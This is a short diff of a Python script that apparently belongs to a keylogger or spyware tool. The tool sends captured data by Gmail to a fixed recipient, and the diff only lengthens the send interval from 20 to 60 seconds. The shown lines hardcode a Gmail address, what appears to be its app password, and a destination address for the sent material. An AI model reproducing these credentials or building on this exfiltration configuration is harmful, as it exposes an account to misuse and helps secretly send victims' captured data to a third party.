@@ -20,7 +20,7 @@ from email import encoders
 yourgmail = "mona.lisa111924@gmail.com"
 yourgmailpass = "blve sruj jvtf qpbj"
 sendto = "fmichl468@gmail.com"
-interval = 20  # seconds
+interval = 60  # seconds
 
 # Globals
 t = ""
